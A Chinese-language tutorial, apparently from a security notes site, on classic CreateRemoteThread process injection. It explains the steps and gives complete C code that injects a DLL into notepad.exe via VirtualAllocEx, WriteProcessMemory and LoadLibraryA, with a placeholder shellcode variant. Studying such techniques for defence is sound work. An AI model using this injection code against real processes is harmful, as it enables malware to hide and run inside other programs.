---
description: 经典代码&dll注入
---

# CreateRemoteThread

## 远程线程注入

远程线程注入是指一个进程在另一个进程中创建线程的技术，通常用于注入dll或shellcode，两者执行方式会有一些简单的差异但是原理相同，这是一种简单且稳定的经典注入方式，被很多病毒木马所青睐，此外也存在更新式的注入方式。

## 注入流程

1. 打开被注入进程的句柄
2. 通过句柄向被注入进程申请可写可执行空间
3. 往申请的空间内写入必要数据（dllpath&shellcode）
4. 通过windows提供的api创建线程

![](../.gitbook/assets/remote.gif)

## 编程实现

### 0.使用函数原型

```text
HANDLE OpenProcess(
  DWORD dwDesiredAccess,
  BOOL  bInheritHandle,
  DWORD dwProcessId
);
```

```text
LPVOID VirtualAllocEx(
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);
```

```text
BOOL WriteProcessMemory(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);
```

```text
HANDLE CreateRemoteThread(
  HANDLE                 hProcess,
  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  SIZE_T                 dwStackSize,
  LPTHREAD_START_ROUTINE lpStartAddress,
  LPVOID                 lpParameter,
  DWORD                  dwCreationFlags,
  LPDWORD                lpThreadId
);
```

### 1.打开被注入进程的句柄

```text
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, <pid>);
```

### 2.通过句柄向被注入进程申请可写可执行空间

```text
LPVOID lpBaseAddress = VirtualAllocEx(hProcess, 0, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
```

### 3.往申请的空间内写入必要数据（dll&shellcode）

#### 3.1 shellcode

```text
char shellcode[]="XXXXXX";
WriteProcessMemory(hProcess, lpBaseAddress, shellcode, sizeof(shellcode), NULL);
```

#### 3.2 DLL注入

```text
char path[]="c:/test/test.dll";
WriteProcessMemory(hProcess, lpBaseAddress, path, sizeof(path), NULL);
```

### 4.通过windows提供的api创建线程

#### 4.1 shellcode

```text
CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)lpBaseAddress, 0, 0, 0);
```

#### 4.2 DLL注入

我们都知道在进程载入DLL的时候会调用DLLMAIN函数,同时由于ASLR\(基址随机化\)的缘故，在操作系统启动时，DLL的加载地址不尽相同,但由于部分系统DLL要求在系统启动后必须固定，所以我们通过GetProcAddress函数获取操作系统加载DLL的函数。

也就是说,虽然进程不同但是部分系统dll在不同进程中的地址是相同的，那么我们可以通过获取本地进程的相关函数作为远程线程函数的启动参数,并把申请的空间指向加载DLL保存路径的字符串，就可以远程加载DLL。

* 不同进程的kernel32.dll

![](../.gitbook/assets/image%20%2882%29.png)

![](../.gitbook/assets/image%20%282%29.png)



```text
    WriteProcessMemory(hProcess, lpBaseAddress, path, sizeof(path), NULL);
    LPTHREAD_START_ROUTINE pLoadlibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)pLoadlibrary, lpBaseAddress, 0, 0);
```

![](../.gitbook/assets/image%20%2833%29.png)

## 优化与使用

* 根据进程名查找PID

```text
#include <Tlhelp32.h>
DWORD GetProcessIdByName(LPCTSTR lpszProcessName)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	PROCESSENTRY32 pe;
	pe.dwSize = sizeof pe;

	if (Process32First(hSnapshot, &pe))
	{
		do {
			if (lstrcmpi(lpszProcessName, pe.szExeFile) == 0)
			{
				CloseHandle(hSnapshot);
				return pe.th32ProcessID;
			}
		} while (Process32Next(hSnapshot, &pe));
	}

	CloseHandle(hSnapshot);
	return 0;
}
```

* 完整代码

```text
#include <stdio.h>
#include <Windows.h>
#include <Tlhelp32.h>
DWORD GetProcessIdByName(LPCTSTR lpszProcessName)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	PROCESSENTRY32 pe;
	pe.dwSize = sizeof pe;

	if (Process32First(hSnapshot, &pe))
	{
		do {
			if (lstrcmpi(lpszProcessName, pe.szExeFile) == 0)
			{
				CloseHandle(hSnapshot);
				return pe.th32ProcessID;
			}
		} while (Process32Next(hSnapshot, &pe));
	}

	CloseHandle(hSnapshot);
	return 0;
}
char path[] = "C:\\Users\\Black Sheep\\source\\repos\\CreateRemoteThread\\x64\\Release\\TestDll.dll";

int main()
{
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, GetProcessIdByName((LPCTSTR)"notepad.exe"));
    
    LPVOID lpBaseAddress = VirtualAllocEx(hProcess, 0, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, lpBaseAddress, path, sizeof(path), NULL);
    LPTHREAD_START_ROUTINE pLoadlibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)pLoadlibrary, lpBaseAddress, 0, 0);
    return 0;
}

```

* github:[https://github.com/idiotc4t/CreateRemoteThread](https://github.com/idiotc4t/CreateRemoteThread)

## LINKS

{% embed url="https://www.elastic.co/cn/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process" %}

{% embed url="https://docs.microsoft.com/en-us/windows/win32/api/" %}



